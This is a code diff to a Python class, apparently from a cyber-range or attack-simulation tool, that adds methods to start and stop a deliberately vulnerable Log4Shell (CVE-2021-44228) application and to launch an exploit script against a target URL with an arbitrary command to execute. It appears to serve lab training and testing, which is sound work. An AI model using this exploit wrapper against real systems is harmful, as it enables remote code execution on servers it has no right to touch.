@@ -16,6 +16,7 @@ class Trainman:
         self.admin_password = None
         self.samba_process = None
         self.samba_users = None
+        self.log4j_process = None
 
     def set_args(self, args, attack_ip, hostname, local_ip):
         self.args = args
@@ -239,6 +240,73 @@ class Trainman:
         os.rename('/etc/samba/smb.conf.bak', '/etc/samba/smb.conf')
         output = {'outcome': 'success', 'message': 'Samba process killed', 'forward_log': 'True'}
         return output
+
+    def start_cve_2021_44228_app(self):
+        if 'port' in self.args:
+            port = self.args['port']
+        else:
+            output = {'outcome': 'failed', 'message': 'Missing port', 'forward_log': 'False'}
+            return output
+        log4j_cmd = ['java', '-jar /log4shell-vulnerable-app/app/spring-boot-application.jar', f'--server.port={port}']
+        self.log4j_process = subprocess.Popen(
+            log4j_cmd, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE
+        )
+        log4j_cmd_output = self.log4j_process.communicate()[0].decode('ascii')
+        if log4j_cmd_output:
+            output = {'outcome': 'failed', 'message': log4j_cmd_output, 'forward_log': 'False'}
+            return output
+        else:
+            output = {'outcome': 'success', 'message': 'cve_2021_44228_app is running', 'forward_log': 'True'}
+            return output
+
+    def stop_cve_2021_44228_app(self):
+        if not self.log4j_process:
+            output = {'outcome': 'failed', 'message': 'no cve_2021_44228_app is running', 'forward_log': 'False'}
+            return output
+        self.log4j_process.terminate()
+        output = {'outcome': 'success', 'message': 'cve_2021_44228_app stopped', 'forward_log': 'True'}
+        return output
+
+    def exploit_cve_2021_44228(self):
+        if 'target_url' in self.args:
+            target_url = self.args['target_url']
+        else:
+            output = {'outcome': 'failed', 'message': 'Missing target_url', 'forward_log': 'False'}
+            return output
+        if 'http_port' in self.args:
+            http_port = self.args['http_port']
+        else:
+            output = {'outcome': 'failed', 'message': 'Missing http_port', 'forward_log': 'False'}
+            return output
+        if 'ldap_port' in self.args:
+            ldap_port = self.args['ldap_port']
+        else:
+            output = {'outcome': 'failed', 'message': 'Missing ldap_port', 'forward_log': 'False'}
+            return output
+        if 'exec_cmd' in self.args:
+            exec_cmd = self.args['exec_cmd']
+        else:
+            output = {'outcome': 'failed', 'message': 'Missing exec_cmd', 'forward_log': 'False'}
+            return output
+        exploit_cve_2021_44228_cmd = [
+            'python3',
+            '/L4sh/main.py',
+            f'-i {self.host_info[2]}',
+            f'-u {target_url}',
+            f'-c {exec_cmd}',
+            f'-p {http_port}',
+            f'-l {ldap_port}'
+        ]
+        exploit_cve_2021_44228_process = subprocess.Popen(
+            exploit_cve_2021_44228_cmd, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE
+        )
+        exploit_cve_2021_44228_cmd_output = exploit_cve_2021_44228_process.communicate()[0].decode('ascii')
+        if exploit_cve_2021_44228_cmd_output:
+            output = {'outcome': 'failed', 'message': exploit_cve_2021_44228_cmd_output, 'forward_log': 'False'}
+            return output
+        else:
+            output = {'outcome': 'success', 'message': 'exploit_cve_2021_44228 executed', 'forward_log': 'True'}
+            return output
 
     def echo(self):
         match = {
